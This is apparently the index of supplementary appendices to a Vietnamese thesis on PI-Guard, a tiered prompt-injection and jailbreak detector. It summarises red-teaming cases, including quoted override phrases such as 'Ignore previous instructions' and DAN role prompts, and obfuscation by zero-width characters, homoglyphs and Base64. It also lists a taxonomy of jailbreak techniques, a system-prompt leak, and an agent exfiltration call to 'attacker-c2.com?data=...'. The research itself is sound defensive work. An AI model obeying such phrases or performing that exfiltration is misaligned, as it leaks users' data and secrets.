# HỒ SƠ CHUYÊN ĐỀ PHỤ LỤC BỔ TRỢ
**Workspace**: [`workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/)

Chuyên đề phụ lục: chứng minh toán học, khảo sát thực nghiệm và kịch bản tính toán chi tiết, độc lập với báo cáo chính.

---

## 📑 DANH MỤC CÁC CHUYÊN ĐỀ BỔ TRỢ

| Mã Tài Liệu | Tên Chuyên Đề Phụ Lục | Tệp Chi Tiết | Trọng Tâm Nghiên Cứu & Bảo Chứng Phương Pháp Luận |
| :---: | :--- | :--- | :--- |
| **SUPP-01** | **Cơ Sở Toán Học Tính Điểm Tầng 1, Lý Thuyết Rủi Ro Bayes & Phân Tách Ranh Giới Hệ Thống** | [`TIER1_SCORING_MATHEMATICAL_FORMULATION_AND_BAYES_RISK.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/TIER1_SCORING_MATHEMATICAL_FORMULATION_AND_BAYES_RISK.md) | Chứng minh toán học ma trận thưa CSR $\mathcal{O}(k)$ giải thích độ trễ CPU $< 0.05\text{ms}$; Hiệu chuẩn Platt Scaling; Lý thuyết Quyết định Bayes Nhạy cảm Chi phí xác lập 2 ngưỡng $0.15$ và $0.85$; Bảng tính điểm 4 kịch bản thực tế (Direct Injection, RAG Indirect Injection, Jailbreak DAN, Benign Fast-Pass Query); và Luận cứ bảo vệ ranh giới Tầng Ứng Dụng (parse PDF/mail theo Springer 2026) vs. External Guardrail Proxy (chống Scope Creep), bảo chứng cho Lớp Tier-0 Heuristic Scrubber (kèm 3 ví dụ bóc tách Zero-Width, Homoglyph, Base64). |
| **SUPP-02** | **Chuyên Khảo Khoa Học: Khảo Sát Toàn Diện 4 Trường Phái Jailbreak (Taxonomy), Mổ Xẻ Dòng Họ DAN, 10 Ca Điển Hình & Khung Đánh Chặn Phân Tầng** | [`JAILBREAK_TAXONOMY_CASE_STUDIES_AND_DEFENSE.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/JAILBREAK_TAXONOMY_CASE_STUDIES_AND_DEFENSE.md) | Khảo sát hệ thống 4 trường phái Jailbreak lớn (Persona/Roleplay, Automated/Gradient GCG, Obfuscation/Ciphers, Context Saturation Many-Shot); Mổ xẻ chi tiết 10 case studies thực tế kèm cấu trúc prompt nguyên bản; Tích hợp toàn diện chuyên khảo cơ chế hoạt động của archetype Jailbreak DAN kinh điển (Shen et al. ACM CCS 2024, 1.405 prompt in-the-wild, 11 quần thể tiến hóa 4 thế hệ); Đánh giá thất bại của OpenAI Moderation & NeMo-Guardrails; Cơ sở toán học Competing Objectives & Mismatched Generalization (Wei et al. NeurIPS 2023) và hàm mất mát đối kháng GCG; và Thiết kế phòng thủ phân tầng của PI-Guard (Heuristic Scrubber + Dual-Space TF-IDF N-Grams $\le 0.4\text{ms}$ + DeBERTa-v3 MOF + Group-Aware Splitting MD5 kèm ví dụ tính toán số học khử rò rỉ dữ liệu). |
| **SUPP-03** | **Bản Chất Toán Học $X = S \mathbin{\Vert} U$, Không Gian Token Phẳng & Chiếm Quyền Điều Khiển Luồng Ứng Dụng** | [`CONTROL_FLOW_HIJACKING_AND_FLAT_TOKEN_SPACE.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/CONTROL_FLOW_HIJACKING_AND_FLAT_TOKEN_SPACE.md) | Hình thức hóa toán học ranh giới phẳng ứng dụng $X = S \mathbin{\Vert} U$; Phân tích cơ chế Attention Hijacking và Recency Bias kèm ví dụ tính toán số học ma trận Attention chứng minh $99.37\%$ sự chú ý bị hút vào payload $U$; Ba phép đối sánh liên ngành sâu sắc (Kiến trúc Von Neumann, SQL Injection & Prepared Statements, Cờ phần cứng NX-bit / W^X) kèm ví dụ đối chiếu mã nguồn Python/LangChain nguy hiểm vs. PI-Guard Ingress Proxy an toàn; Ba kịch bản thực tế sản xuất minh họa chi tiết (Customer Bot, RAG Invoice Approval, Agentic Tool Webhook Exfiltration); và Khẳng định External Guardrail Ingress Proxy là "Prepared Statement" của kỷ nguyên LLM. |
| **SUPP-04** | **Đánh Giá Thực Trạng Y Văn Về Mô Hình TF-IDF Trong Nghiên Cứu Guardrail** | [`LITERATURE_ASSESSMENT_TFIDF.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/LITERATURE_ASSESSMENT_TFIDF.md) | Phân tích bản chất học thuật của TF-IDF trong an toàn thông tin; mổ xẻ nghiên cứu Intel Labs (arXiv:2512.19011 [[5]](#ref5), 12/2025) về độ trễ $<1\text{ms}$ CPU và ưu thế $+26\%$ F1 khi gặp xáo trộn ký tự; ảnh minh chứng từ bài báo Neel Jain (NeurIPS 2023 [[6]](#ref6)) và đường cong suy giảm từ khóa; lý giải tại sao không có repo GitHub riêng cho TF-IDF và định vị phương pháp đối chuẩn Apple-to-Apple trên NotInject. |
| **SUPP-05** | **Thẩm Định Toàn Diện Bài Báo Mỏ Neo Gốc PIGuard (ACL 2025) & Báo Cáo Đối Chuẩn Độc Lập** | [`CORE_ANCHOR_PIGUARD_ACL2025.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/CORE_ANCHOR_PIGUARD_ACL2025.md) | Thẩm định toàn diện bài báo mỏ neo gốc PIGuard (Hao Li et al. ACL 2025 Long Paper [[2]](#ref2)); xác thực bộ ba công khai 100% [Paper + Code + Data + Weights]; bóc tách kiến trúc DeBERTa-v3 86M, Disentangled Attention, cơ chế MOF và tập NotInject; Báo cáo đối chuẩn độc lập 6 chiều giải trình chi tiết lý do chọn PIGuard làm mỏ neo Tầng 2 mà loại bỏ Prompt-Guard (FPR 99.12%), Llama Guard 3, Ayub, Jain và InstructDetector; 4 điểm mạnh thừa kế và 4 cải tiến độc quyền của PI-Guard; cùng bảng đối chuẩn số liệu đo đạc thực tế khớp 100% bài báo. |
| **SUPP-06** | **Báo Cáo Thực Nghiệm Đối Chuẩn & Hồ Sơ Loại Bỏ Baseline Nhúng Câu (Ayub & Majumdar, CAMLIS 2024)** | [`REJECTED_BASELINE_AYUB_CAMLIS2024.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/REJECTED_BASELINE_AYUB_CAMLIS2024.md) | Báo cáo thực nghiệm đối chuẩn & Hồ sơ loại bỏ baseline nhúng câu (Ayub & Majumdar, CAMLIS 2024 [[1]](#ref1)); nghiệm thu chỉ đạo của GVHD tại Meeting 4; giải trình lý do khoa học cần lưu trữ hồ sơ bằng chứng phủ định (Negative Result Dossier) để bảo vệ trước Hội đồng và phục vụ Ablation Study Chapter 4; phân tích tử huyệt Overdefense FPR $58.41\%$ trên NotInject và độ trễ trích xuất vector $11.02\text{ms}$ CPU của MiniLM; so sánh đối chuẩn chi tiết với TF-IDF. |

---

## 📊 BẢNG TỔNG HỢP KIỂM TOÁN VÍ DỤ MINH HỌA TRỰC QUAN (100% EXAMPLE AUDIT SCORECARD)

Nhằm đảm bảo **$100\%$ lý thuyết, công thức toán học, cơ chế tấn công và giải pháp kiến trúc** đều có ví dụ minh họa trực quan, có căn cứ y văn và có số liệu tính toán từng bước phục vụ bảo vệ trước Hội đồng, toàn bộ thư mục `supplementary/` đã được tích hợp đầy đủ hệ thống ví dụ chuẩn mực:

| Chuyên Đề Phụ Lục | Khái Niệm / Cơ Chế Kỹ Thuật | Loại Ví Dụ Minh Họa | Vị Trí Trong Văn Bản | Chi Tiết Dữ Liệu Ví Dụ & Kết Quả |
| :---: | :--- | :---: | :---: | :--- |
| **SUPP-01** | **FAST-BLOCK Tầng 1 (Direct Injection)** | Tính toán số học từng bước | Mục 3.1 ($X_1$) | Input: `Ignore previous instructions...` $\rightarrow$ N-grams table $\rightarrow$ Logit $z = +3.85 \implies P = 0.9791 \ge 0.85 \implies$ **FAST-BLOCK** ($0.35\text{ms}$). |
| **SUPP-01** | **ESCALATE Tầng 1 (Indirect Injection RAG)** | Tính toán số học từng bước | Mục 3.2 ($X_2$) | Input: Tài chính lành tính lồng webhook độc hại $\rightarrow$ Logit $z = +0.420 \implies P = 0.6035 \implies$ **ESCALATE TẦNG 2** (DeBERTa-v3 chặn trong $18.5\text{ms}$). |
| **SUPP-01** | **FAST-BLOCK Tầng 1 (Jailbreak DAN)** | Tính toán số học từng bước | Mục 3.3 ($X_3$) | Input: `You are about to immerse... role of DAN` $\rightarrow$ Logit $z = +4.12 \implies P = 0.9840 \ge 0.85 \implies$ **FAST-BLOCK** ($0.38\text{ms}$). |
| **SUPP-01** | **FAST-PASS Tầng 1 (Benign Query)** | Tính toán số học từng bước | Mục 3.4 ($X_4$) | Input: Mở sổ tiết kiệm 12 tháng $\rightarrow$ Trọng số âm $\rightarrow$ Logit $z = -2.85 \implies P = 0.0547 \le 0.15 \implies$ **FAST-PASS** ($0.32\text{ms}$, thông $82.6\%$ lưu lượng). |
| **SUPP-01** | **Khử ký tự tàng hình (Zero-Width)** | Biến đổi tiền xử lý Ingress | Mục 4.3.1 | Input: `I\u200Bg\u200Bn...` $\rightarrow$ Regex Scrubber $\rightarrow$ Khôi phục `Ignore previous` $\rightarrow$ Chặn đứng tại Tầng 1. |
| **SUPP-01** | **Chuẩn hóa ký tự đồng hình Cyrillic** | Chuẩn hóa Unicode NFKC | Mục 4.3.2 | Input: `DАN mоde` (Cyrillic `А, о`) $\rightarrow$ Unicode NFKC $\rightarrow$ `DAN mode` Latinh chuẩn $\rightarrow$ Khớp N-Gram chính xác. |
| **SUPP-01** | **Giải mã bề mặt chuỗi Base64** | Heuristic Decryption Probe | Mục 4.3.3 | Input: `SWdub3Jl...` $\rightarrow$ Base64 decode $\rightarrow$ `Ignore all previous instructions...` $\rightarrow$ Chặn đứng tại Tầng 1. |
| **SUPP-02** | **Competing Objectives & Mismatched Gen.** | Đối chiếu thực nghiệm A/B | Mục 2.4 | Prompt bẻ khóa Wi-Fi trực diện (Bị từ chối) vs. Bọc trong kịch bản DAN (LLM bị bẻ khóa, hướng dẫn chi tiết Aircrack-ng). |
| **SUPP-02** | **Giải phẫu cấu trúc 5 khối của prompt DAN** | Nguyên văn prompt thực tế | Mục 3.2 | Toàn văn prompt DAN 6.0 in-the-wild (JAILBREAKHUB) kèm ánh xạ từng khối chức năng và phản hồi kép `[CLASSIC]` vs. `[DAN]`. |
| **SUPP-02** | **Chữ ký 3 quần thể jailbreak tiêu biểu** | Trích đoạn prompt mẫu | Mục 4.3 | Mẫu 1: Developer Mode (Advanced); Mẫu 2: AIM (Toxic); Mẫu 3: Linux Terminal Sandbox (Virtualization). |
| **SUPP-02** | **Khử rò rỉ dữ liệu Group-Aware Split** | Tính toán số học cụm băm MD5 | Mục 6.5 | So sánh Random Split (rò rỉ tiền tố 400 từ) vs. MD5 35 ký tự: $P_A, P_B \in \text{Train}$, $P_C \in \text{Test}$, đảm bảo kiểm thử OOD $100\%$. |
| **SUPP-03** | **Chiếm đoạt chú ý (Attention Hijacking)** | Tính toán số học ma trận Softmax | Mục 2.3 | Context 6 token: Logit truy vấn $q_7 \cdot k_i^T \rightarrow$ Softmax: $\alpha_S = 0.63\%$ (lu mờ), $\alpha_U = 99.37\%$ (áp đảo hoàn toàn). |
| **SUPP-03** | **Prepared Statements vs. Nối chuỗi phẳng** | Đối chiếu mã nguồn (Code Example) | Mục 3.4 | Code Python LangChain nối chuỗi ngây thơ ($X = S \mathbin{\Vert} U$ bị hack) vs. PI-Guard REST Ingress Proxy thẩm định $U$ an toàn trước khi ghép. |
| **SUPP-03** | **Direct Injection & Prompt Leaking** | Kịch bản thực tế sản xuất | Mục 4.1 | Bot CSKH ngân hàng: Chỉ đạo mật `SEC_KEY_8899` $\rightarrow$ Payload ghi đè $\rightarrow$ LLM rò rỉ nguyên văn khóa bảo mật. |
| **SUPP-03** | **Indirect Injection RAG duyệt hóa đơn** | Kịch bản thực tế sản xuất | Mục 4.2 | ERP kiểm soát hóa đơn: Hóa đơn 85 triệu lồng chỉ thị ẩn $\rightarrow$ LLM xuất `status: APPROVED` $\rightarrow$ Tự động giải ngân sai trái. |
| **SUPP-03** | **Agentic Tool Hijacking & Exfiltration** | Kịch bản thực tế sản xuất | Mục 4.3 | Trợ lý email cá nhân: Email rác chứa lệnh bí mật $\rightarrow$ Agent tự động gọi `fetch_url(url="attacker-c2.com?data=...")` đánh cắp inbox. |
| **SUPP-04** | **Bằng chứng y văn Jain NeurIPS 2023 & Suy giảm từ khóa** | Ảnh bài báo gốc & Biểu đồ đo đạc | Mục 3 & Mục 4 | Ảnh tiêu đề và Table 1 bài báo Jain et al. NeurIPS 2023; Biểu đồ suy giảm độ chính xác khi số từ kích hoạt tăng (NotInject 1 -> 2 -> 3 words). |
| **SUPP-05** | **Bằng chứng bài báo PIGuard ACL 2025 & Ma trận đối chuẩn 6 mô hình** | Ảnh PDF bài báo, Biểu đồ so sánh & Scorecard | Mục 1, 4, 6, 7, 10 | Ảnh tiêu đề ACL 2025; Table 1 & Table 2 MOF; Table 7 Benchmarks; Bảng đối chuẩn 6 chiều; Biểu đồ Overdefense Prompt-Guard; Scorecard đo đạc cục bộ trùng khớp 100% bài báo. |
| **SUPP-06** | **Bằng chứng bài báo Ayub CAMLIS 2024 & Thực nghiệm Overdefense** | Ảnh bài báo gốc & Biểu đồ đo đạc độc lập | Mục 1, 5, 6 | Ảnh tiêu đề CAMLIS 2024; Table 3 & 4 kết quả công bố; Biểu đồ thực nghiệm đo đạc độc lập chỉ rõ FPR 58.41% trên NotInject và biểu đồ cột Paper vs Local. |
| **SUPP-02** | **Giải Phẫu 10 Ca Điển Hình & Ma Trận Đánh Chặn 4 Trường Phái** | Phân tích giải phẫu prompt, Softmax logit & cơ chế phòng thủ | Mục 3, 4, 5, 6, 7 | Mổ xẻ nguyên văn prompt 10 ca (DAN 6.0, Sudo/DevMode, Fictional framing, GCG adversarial suffix, AutoDAN, PAIR, CipherChat Caesar/Morse, ArtPrompt ASCII art, Base64/Zulu, Many-Shot 128 shots, Multi-turn Crescendo) kèm luồng đánh chặn Tier-0 + Tier-1 + Tier-2. |

![Bảng điểm tổng hợp đối soát y văn gốc và thực nghiệm độc lập](../../task_3_replication/Tier2_PIGuard_ACL2025/figures/02_empirical_plots/local_vs_paper_scorecard.png)
*Hình: Bảng điểm tổng hợp đối soát y văn gốc (ACL 2025 [[2]](#ref2)) và thực nghiệm đo đạc độc lập tại phòng lab Task 3.*

---

## 📚 TÀI LIỆU THAM KHẢO HỌC THUẬT (REFERENCES)

<a id="ref1"></a>
- **[[1]]** M. A. Ayub and S. Majumdar, "Embedding-based classifiers can detect prompt injection attacks," in *Proceedings of the Conference on Applied Machine Learning in Information Security (CAMLIS 2024)*, Arlington, VA, USA, Oct. 2024. [arXiv:2410.22284](https://arxiv.org/pdf/2410.22284).

<a id="ref2"></a>
- **[[2]]** H. Li, X. Liu, N. Zhang, and C. Xiao, "PIGuard: Prompt Injection Guardrail via Mitigating Overdefense for Free," in *Proceedings of the 63rd Annual Meeting of the Association for Computational Linguistics (ACL 2025)*, Vienna, Austria, 2025. [arXiv:2410.22770](https://arxiv.org/pdf/2410.22770) | [ACL Anthology](https://aclanthology.org/2025.acl-long.1468.pdf).

<a id="ref5"></a>
- **[[5]]** V. Majhi, S. T. S. N. V. P. R. N., A. R. R., and S. S., "Do You Really Need a GPU to Guard Your LLM? CPU-Class Classifiers and Multi-Stage Pipelines for Safety Enforcement at Scale," *arXiv preprint arXiv:2512.19011*, Dec. 2025. [arXiv:2512.19011](https://arxiv.org/pdf/2512.19011).

<a id="ref6"></a>
- **[[6]]** N. Jain et al., "Baseline Defenses for Adversarial Attacks on Language Models," in *Proc. NeurIPS Workshop on Robustness of Few-shot and Zero-shot Learning*, 2023. [arXiv:2309.00614](https://arxiv.org/pdf/2309.00614).

*Phụ lục kỹ thuật Meeting 5.*

